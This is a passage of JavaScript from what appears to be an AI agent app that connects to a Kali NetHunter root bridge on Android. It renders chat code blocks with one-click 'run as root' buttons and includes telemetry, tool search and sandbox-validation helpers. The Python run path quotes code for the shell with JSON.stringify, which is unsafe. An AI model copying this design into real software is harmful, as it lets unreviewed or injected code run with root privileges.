        .replace(/</g, '&lt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function formatMarkdown(text) {
    if (!text) return '';

    // Code blocks with Run / Copy actions
    let html = escapeHtml(text).replace(/```([a-zA-Z0-9_-]*)\n([\s\S]*?)```/g, (match, lang, code) => {
        const cleanCode = code.trim();
        const jsonCode = JSON.stringify(cleanCode);
        const l = (lang || '').toLowerCase();
        const isShell = (l === 'bash' || l === 'sh' || l === 'shell');
        const isPython = (l === 'python' || l === 'py' || l === 'python3');
        let runBtn = '';
        if (isShell) {
            runBtn = `<button class="holo-term-btn" onclick="execQuick(${escapeHtmlAttr(jsonCode)})">▶ RUN IN KALI</button>`;
        } else if (isPython) {
            const pyCmd = JSON.stringify(`python3 -c ${JSON.stringify(cleanCode)}`);
            runBtn = `<button class="holo-term-btn" onclick="execQuick(${escapeHtmlAttr(pyCmd)})">▶ RUN PYTHON</button>`;
        }
        const copyBtn = `<button class="holo-term-btn" onclick="copyText(${escapeHtmlAttr(jsonCode)})">📋 COPY</button>`;

        return `<div class="holo-code-block" style="background:rgba(3,7,15,0.75); border:1px solid rgba(0,240,255,0.25); border-left:3px solid var(--neon-cyan); border-radius:6px; margin:10px 0; padding:10px; font-family:var(--font-code); font-size:13px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; font-size:12px; color:var(--neon-cyan);">
                <span>${escapeHtml(lang || 'code')}</span>
                <div style="display:flex; gap:8px;">${runBtn}${copyBtn}</div>
            </div>
            <pre style="margin:0; overflow-x:auto; color:#e2e8f0; white-space:pre-wrap; font-family:inherit; font-size:13px; line-height:1.45;">${cleanCode}</pre>
        </div>`;
    });

    // Inline code
    html = html.replace(/`([^`]+)`/g, '<code style="color:#00f0ff; background:rgba(0,240,255,0.1); padding:2px 8px; border-radius:4px; font-family:monospace; font-size:13.5px;">$1</code>');
    // Bold & italic
    html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    html = html.replace(/\*(.*?)\*/g, '<em>$1</em>');
    // Newlines
    html = html.replace(/\n/g, '<br>');

    return html;
}

// ===================== 11. KALI NETHUNTER TELEMETRY & TERMUX =====================
window.launchOrStartTermux = function() {
    Bridge.vibrate(30);
    if (Bridge.hasBridge() && window.AndroidBridge.startTermuxBridge) {
        const res = window.AndroidBridge.startTermuxBridge();
        Bridge.showToast(res);
        appendFreeNode("TERMUX // BRIDGE LAUNCH", `<div style="font-family:var(--font-code); font-size:13px; color:#00f0ff;">${escapeHtml(res)}<br>Checking bridge status...</div>`, "system");
        setTimeout(updateNetHunterPill, 3000);
    } else if (Bridge.hasBridge() && window.AndroidBridge.launchTermux) {
        window.AndroidBridge.launchTermux();
        Bridge.showToast("Opening Termux...");
    } else {
        appendFreeNode("TERMUX // INSTRUCTIONS", `<div style="font-family:var(--font-code); font-size:13px; color:#cbd5e1;">Open Termux and run:<br><code style="color:#00f0ff;">nh -r</code><br><code style="color:#00f0ff;">agentic bridge start</code></div>`, "system");
    }
};

window.inspectNetHunter = function() {
    Bridge.vibrate(30);
    const isOnline = Bridge.isNetHunterOnline();
    const rawStatus = Bridge.getNetHunterStatus();
    let statusObj = {};
    try { statusObj = JSON.parse(rawStatus); } catch (e) {}

    let content = '';
    if (isOnline) {
        const tools = statusObj.tools || {};
        const available = Object.keys(tools).filter(k => tools[k]).join(', ') || 'nmap, python3, curl, git, apt-get, pip';
        content = `
            <div style="font-family:var(--font-code); font-size:13px; line-height:1.6; color:#cbd5e1;">
                <div style="color:var(--neon-emerald); font-weight:700; margin-bottom:8px; font-size:13.5px;">✓ KALI NETHUNTER ROOT BRIDGE: ONLINE</div>
                <div><strong>Daemon:</strong> http://127.0.0.1:8765 (PID: ${statusObj.pid || 'Active'})</div>
                <div><strong>Privileges:</strong> ${escapeHtml(statusObj.user || 'root')} (UID: ${statusObj.uid !== undefined ? statusObj.uid : 0}) — Root Access: YES</div>
                <div><strong>Host System:</strong> ${escapeHtml(statusObj.os || 'Kali GNU/Linux Rolling')} (${escapeHtml(statusObj.platform || 'aarch64')})</div>
                <div><strong>Kernel:</strong> ${escapeHtml(statusObj.kernel || 'Linux')}</div>
                <div><strong>CLI Interface:</strong> <code>agentic</code> / <code>ae</code></div>
                <div><strong>Installed Tools:</strong> ${escapeHtml(available)}</div>
                <div style="margin-top:12px; display:flex; gap:8px; flex-wrap:wrap;">
                    <button onclick="execQuick('whoami && id')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:6px 10px; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer;">whoami</button>
                    <button onclick="execQuick('uname -a')" style="background:rgba(255,0,127,0.15); border:1px solid #ff007f; color:#ff007f; padding:6px 10px; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer;">Kernel Info</button>
                    <button onclick="execQuick('agentic bridge status')" style="background:rgba(0,255,136,0.15); border:1px solid #00ff88; color:#00ff88; padding:6px 10px; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer;">Bridge Info</button>
                    <button onclick="execQuick('wifi scan')" style="background:rgba(255,183,0,0.15); border:1px solid #ffb700; color:#ffb700; padding:6px 10px; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer;">Scan Wi-Fi</button>
                </div>
            </div>
        `;
    } else {
        content = `
            <div style="font-family:var(--font-code); font-size:13px; line-height:1.6; color:#cbd5e1;">
                <div style="color:var(--neon-magenta); font-weight:700; margin-bottom:8px; font-size:13.5px;">⚠ KALI NETHUNTER BRIDGE: STANDBY / OFFLINE</div>
                <div style="margin-bottom:8px;">To connect this cyberdeck app directly to your Kali Linux NetHunter environment:</div>
                <ol style="margin-left:18px; margin-bottom:10px; line-height:1.55;">
                    <li>Tap the launch button below or open <strong>Termux</strong></li>
                    <li>Launch NetHunter root: <code>nh -r</code></li>
                    <li>Start the background bridge: <code>agentic bridge start</code></li>
                </ol>
                <div style="margin-top:10px; display:flex; gap:10px;">
                    <button onclick="launchOrStartTermux()" style="background:rgba(0,255,136,0.2); border:1px solid #00ff88; color:#00ff88; padding:8px 14px; border-radius:6px; font-size:12.5px; font-weight:700; cursor:pointer;">🚀 Launch Termux / Start Bridge</button>
                    <button onclick="execQuick('whoami')" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:8px 12px; border-radius:6px; font-size:12.5px; font-weight:600; cursor:pointer;">Test Shell</button>
                </div>
                <div style="font-size:12px; color:#64748b; margin-top:8px;">(Local Android shell and direct su root execution will still operate)</div>
            </div>
        `;
    }
    appendFreeNode("NETHUNTER // BRIDGE TELEMETRY", content, "system");
    updateNetHunterPill();
};

window.updateNetHunterPill = function() {
    const pill = document.getElementById('nh-bridge-pill');
    const pillText = document.getElementById('nh-pill-text');
    const drawerStatus = document.getElementById('nh-drawer-status');
    const isOnline = Bridge.isNetHunterOnline();

    if (pillText) {
        pillText.textContent = isOnline ? "NH: ROOT" : "NH: STANDBY";
    }
    if (pill) {
        if (isOnline) {
            pill.className = "hud-pill-btn neon-emerald";
            pill.title = "Kali NetHunter Root Bridge: ONLINE (127.0.0.1:8765)";
        } else {
            pill.className = "hud-pill-btn neon-magenta";
            pill.title = "Kali NetHunter Bridge: STANDBY (Run 'agentic bridge start' in nh -r)";
        }
    }
    if (drawerStatus) {
        drawerStatus.textContent = isOnline ? "ONLINE (ROOT)" : "STANDBY";
        drawerStatus.style.color = isOnline ? "var(--neon-emerald)" : "var(--neon-magenta)";
    }
};

// ============================================================================
// 1. KNUTH IN-MEMORY TRIE SEARCH & LRU TOOL CACHE ENGINE
// ============================================================================
class ToolTrieNode {
    constructor() {
        this.children = {};
        this.isWord = false;
        this.data = null;
    }
}

class ToolTrieSearch {
    constructor() {
        this.root = new ToolTrieNode();
    }

    insert(phrase, payload) {
        if (!phrase) return;
        const words = phrase.toLowerCase().trim().split(/\s+/);
        for (let i = 0; i < words.length; i++) {
            const sub = words.slice(i).join(' ');
            let curr = this.root;
            for (const ch of sub) {
                if (!curr.children[ch]) curr.children[ch] = new ToolTrieNode();
                curr = curr.children[ch];
            }
            curr.isWord = true;
            curr.data = payload;
        }
    }

    searchPrefix(prefix, limit = 8) {
        if (!prefix) return [];
        let curr = this.root;
        for (const ch of prefix.toLowerCase().trim()) {
            if (!curr.children[ch]) return [];
            curr = curr.children[ch];
        }
        const results = [];
        const dfs = (node) => {
            if (results.length >= limit) return;
            if (node.isWord && node.data) {
                if (!results.some(r => (r.id && r.id === node.data.id) || r.title === node.data.title)) {
                    results.push(node.data);
                }
            }
            for (const k in node.children) {
                dfs(node.children[k]);
            }
        };
        dfs(curr);
        return results;
    }
}

class ToolLRUCache {
    constructor(maxCapacity = 50) {
        this.maxCapacity = maxCapacity;
        this.cache = new Map();
    }

    get(key) {
        if (!this.cache.has(key)) return null;
        const val = this.cache.get(key);
        this.cache.delete(key);
        this.cache.set(key, val);
        return val;
    }

    put(key, value) {
        if (this.cache.has(key)) {
            this.cache.delete(key);
        } else if (this.cache.size >= this.maxCapacity) {
            const oldestKey = this.cache.keys().next().value;
            this.cache.delete(oldestKey);
        }
        this.cache.set(key, value);
    }

    has(key) {
        return this.cache.has(key);
    }

    clear() {
        this.cache.clear();
    }
}

const toolLRU = new ToolLRUCache(50);
const toolTrie = new ToolTrieSearch();
window.toolLRU = toolLRU;
window.toolTrie = toolTrie;

function populateTrieFromStoredTools() {
    toolTrie.insert("NetHunter Status", { id: "nh_status", title: "NetHunter Status", action: "inspectNetHunter()" });
    toolTrie.insert("Wi-Fi Scan", { id: "wifi_scan", title: "Wi-Fi Scan", action: "execQuick('wifi scan')" });
    toolTrie.insert("Host Identity", { id: "host_id", title: "Host Identity", action: "execQuick('whoami && uname -a')" });
    toolTrie.insert("Net Interfaces", { id: "ifconfig", title: "Net Interfaces", action: "execQuick('ifconfig')" });
    toolTrie.insert("Ping Test", { id: "ping_test", title: "Ping Test", action: "execQuick('ping -c 3 8.8.8.8')" });
    toolTrie.insert("Synth Tool", { id: "synth_tool", title: "Synth Tool", action: "execQuick('/synth Wi-Fi signal analyzer')" });
    
    if (state.savedTools && Array.isArray(state.savedTools)) {
        state.savedTools.forEach(t => {
            toolTrie.insert(t.title, t);
            toolLRU.put(t.id || t.title, t);
        });
    }
}
window.populateTrieFromStoredTools = populateTrieFromStoredTools;

// ============================================================================
// 2. TURING DETERMINISTIC TOOL DAG & AST SANDBOX VALIDATOR
// ============================================================================
class ToolExecutionDAG {
    constructor() {
        this.nodes = new Map();
        this.edges = new Map();
    }

    addNode(id, actionFn) {
        this.nodes.set(id, actionFn);
        if (!this.edges.has(id)) this.edges.set(id, new Set());
    }

    addDependency(fromId, toId) {
        if (!this.edges.has(fromId)) this.edges.set(fromId, new Set());
        this.edges.get(fromId).add(toId);
    }

    hasCycles() {
        const visited = new Set();
        const recStack = new Set();

        const dfs = (curr) => {
            visited.add(curr);
            recStack.add(curr);
            const neighbors = this.edges.get(curr) || [];
            for (const n of neighbors) {
                if (!visited.has(n) && dfs(n)) return true;
                if (recStack.has(n)) return true;
            }
            recStack.delete(curr);
            return false;
        };

        for (const node of this.nodes.keys()) {
            if (!visited.has(node) && dfs(node)) return true;
        }
        return false;
    }
}
window.ToolExecutionDAG = ToolExecutionDAG;

class WidgetSandboxValidator {
    static validate(htmlCode) {
        if (!htmlCode || typeof htmlCode !== 'string') return { valid: false, error: 'Empty payload' };
        
        // 1. Detect non-yielding infinite loops
        const infiniteLoopRegex = /\b(?:while\s*\(\s*(?:true|1)\s*\)|for\s*\(\s*;\s*;\s*\))\s*\{(?![^}]*\b(break|return|await|setTimeout|requestAnimationFrame)\b)/i;
        if (infiniteLoopRegex.test(htmlCode)) {
            return { valid: false, error: 'Detected potential non-terminating loop without yield.' };
        }

        // 2. Detect unauthorized top-level location overrides
        const dangerousRedirects = [
            /window\.top\.location/i,
            /window\.parent\.location/i,
            /top\.location\s*=/i
        ];
        for (const pattern of dangerousRedirects) {
            if (pattern.test(htmlCode)) {
                return { valid: false, error: 'Top-level frame redirection blocked by sandbox security policy.' };
            }
        }

        return { valid: true };
    }

    static injectWatchdog(htmlCode) {
        const watchdogScript = `<script>
            (function() {
                var __mountTime = Date.now();
                window.addEventListener('error', function(e) {
                    console.warn('[Tool Sandbox Exception]', e.message);
                });
                var __watchdog = setTimeout(function() {
                    // Tool mounted cleanly and reached interactive state
                }, 8000);
            })();
        <\/script>`;

        if (htmlCode.includes('</head>')) {
            return htmlCode.replace('</head>', `${watchdogScript}</head>`);
        } else if (htmlCode.includes('<head>')) {
            return htmlCode.replace('<head>', `<head>${watchdogScript}`);
        }
        return watchdogScript + htmlCode;
    }
}
window.WidgetSandboxValidator = WidgetSandboxValidator;

// ============================================================================
// 3. SWARM ASYNCHRONOUS TELEMETRY & PERSISTENT SESSION ENGINE
// ============================================================================
class TelemetryStreamManager {
    constructor() {
        this.currentTelemetry = {
            status: "standby",
            os: "Kali NetHunter",
            user: "root",
            uid: 0,
            pingMs: null,
            lastPoll: 0
        };
        this.pollInterval = null;
    }

    start(intervalMs = 4000) {
        if (this.pollInterval) clearInterval(this.pollInterval);
        this.fetchTelemetry();
        this.pollInterval = setInterval(() => this.fetchTelemetry(), intervalMs);
    }

    stop() {
        if (this.pollInterval) clearInterval(this.pollInterval);
        this.pollInterval = null;
    }

    async fetchTelemetry() {
        const start = performance.now();
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2500);
            const res = await fetch('http://127.0.0.1:8765/api/status', {
                signal: controller.signal
            });
            clearTimeout(timeoutId);

            if (res.ok) {
                const data = await res.json();
                this.currentTelemetry.status = "online";
                this.currentTelemetry.pingMs = Math.round(performance.now() - start);
                this.currentTelemetry.lastPoll = Date.now();
                this.currentTelemetry.os = data.os || "Kali NetHunter";
                this.currentTelemetry.user = data.user || "root";
                this.currentTelemetry.uid = data.uid !== undefined ? data.uid : 0;
                this.updateHUD(true);
                return;
            }
        } catch (e) {}

        this.currentTelemetry.status = "standby";
        this.currentTelemetry.pingMs = null;
        this.updateHUD(false);
    }

    updateHUD(isOnline) {
        const pill = document.getElementById('nh-bridge-pill');
        const text = document.getElementById('nh-pill-text');
        const drawerStatus = document.getElementById('nh-drawer-status');
        
        if (pill) {
            pill.className = isOnline ? "hud-pill-btn neon-emerald" : "hud-pill-btn neon-magenta";
            pill.title = isOnline 
                ? `Kali NetHunter Root: ONLINE (${this.currentTelemetry.pingMs || 1}ms latency)` 
                : "Kali NetHunter Bridge: STANDBY";
        }
        if (text) {
            text.textContent = isOnline ? "NH: ROOT" : "NH: STANDBY";
        }
        if (drawerStatus) {
            drawerStatus.textContent = isOnline ? `ONLINE (ROOT • ${this.currentTelemetry.pingMs || 1}ms)` : "STANDBY";
            drawerStatus.style.color = isOnline ? "var(--neon-emerald)" : "var(--neon-magenta)";
        }
    }
}

const telemetry = new TelemetryStreamManager();
window.telemetry = telemetry;

class SessionStateManager {
    static exportConfig() {
        const payload = {
            version: "5.0.0",
            timestamp: new Date().toISOString(),
            settings: {
                persona: state.persona,
                provider: state.provider,
                model: state.model,
                customUrl: state.customUrl,
                ttsEnabled: state.ttsEnabled,
                hapticsEnabled: state.hapticsEnabled
            },
            savedTools: state.savedTools
        };
        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `agentic-essence-backup-${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        Bridge.showToast("Cyberdeck configuration exported.");
    }

    static importConfig(jsonString) {
        try {
            const data = JSON.parse(jsonString);
            if (data.savedTools && Array.isArray(data.savedTools)) {
                state.savedTools = data.savedTools;
                localStorage.setItem('ae_saved_tools', JSON.stringify(state.savedTools));
                updateToolboxBadge();
                renderSavedToolsList();
                populateTrieFromStoredTools();
            }
            if (data.settings) {
                if (data.settings.persona) {
                    state.persona = data.settings.persona;
                    localStorage.setItem('ae_persona', state.persona);
                }
                if (data.settings.provider) {
                    state.provider = data.settings.provider;
                    localStorage.setItem('ae_provider', state.provider);
                }
                if (data.settings.model) {
                    state.model = data.settings.model;
                    localStorage.setItem('ae_model', state.model);
                }
            }
            Bridge.showToast("Configuration restored successfully.");
            Bridge.vibrate(40);
        } catch (e) {
            Bridge.showToast("Invalid configuration file.");
        }
    }
}
window.SessionStateManager = SessionStateManager;

// ============================================================================
// 4. LOVELACE SENSORY & HAPTIC HARMONY ENGINE
// ============================================================================
class LovelaceSensorySystem {
    static pulse(mode = 'harmonic') {
        const universe = document.querySelector('.holographic-universe');
        if (!universe) return;

        universe.classList.remove('sensory-harmonic', 'sensory-alert', 'sensory-quantum');
        void universe.offsetWidth; // Force reflow
        
        if (mode === 'harmonic') {
            universe.classList.add('sensory-harmonic');
            if (state.hapticsEnabled) Bridge.vibrate(20);
        } else if (mode === 'alert') {
            universe.classList.add('sensory-alert');
            if (state.hapticsEnabled) Bridge.vibrate(60);
        } else if (mode === 'quantum') {
            universe.classList.add('sensory-quantum');
            if (state.hapticsEnabled) Bridge.vibrate(35);
        }
    }
}
window.LovelaceSensorySystem = LovelaceSensorySystem;
